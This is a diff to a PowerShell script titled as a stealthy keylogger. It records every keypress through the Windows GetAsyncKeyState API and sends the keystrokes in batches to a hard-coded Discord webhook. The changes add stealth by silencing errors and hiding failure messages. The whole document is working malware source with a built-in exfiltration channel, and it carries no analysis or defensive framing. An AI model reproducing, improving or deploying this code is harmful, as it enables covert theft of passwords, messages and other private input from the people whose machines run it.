@@ -1,19 +1,21 @@
+# Stealthy PowerShell Keylogger with Discord Webhook
+
 # Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv"
 
-# Function to send data to Discord
+# Function to send keylogs to Discord in batches
 function Send-LogToDiscord {
     param([string]$message)
 
     try {
         $payload = @{ content = $message } | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
     } catch {
-        Write-Host "Error sending message to Discord: $_"
+        # Prevent errors from being visible
     }
 }
 
-# Load Windows API for keylogging
+# Load Windows API to capture keypresses
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -23,21 +25,27 @@ public class KeyLogger {
 }
 "@ -Name "KeyLogger" -Namespace "KeyLoggerNamespace"
 
-# Keylogger loop
+# Keylogger loop with batch sending
+$log = ""
 while ($true) {
     for ($i = 8; $i -lt 256; $i++) {
         if ([KeyLoggerNamespace.KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
-            $key = [char]$i
-            if ($i -eq 13) { $key = "[ENTER]" }
-            if ($i -eq 8) { $key = "[BACKSPACE]" }
-            if ($i -eq 9) { $key = "[TAB]" }
-            if ($i -eq 32) { $key = "[SPACE]" }
-
-            # Send keystroke to Discord
-            Send-LogToDiscord -message "Key pressed: $key"
-
-            # Prevent flooding
-            Start-Sleep -Milliseconds 100
+            $key = switch ($i) {
+                13 { "[ENTER]" }
+                8  { "[BACKSPACE]" }
+                9  { "[TAB]" }
+                32 { "[SPACE]" }
+                default { [char]$i }
+            }
+            $log += "$key "
         }
     }
+    
+    # Send logs in batches to avoid spamming
+    if ($log.Length -gt 5) {
+        Send-LogToDiscord -message "Keys: $log"
+        $log = ""
+    }
+    
+    Start-Sleep -Milliseconds 500
 }
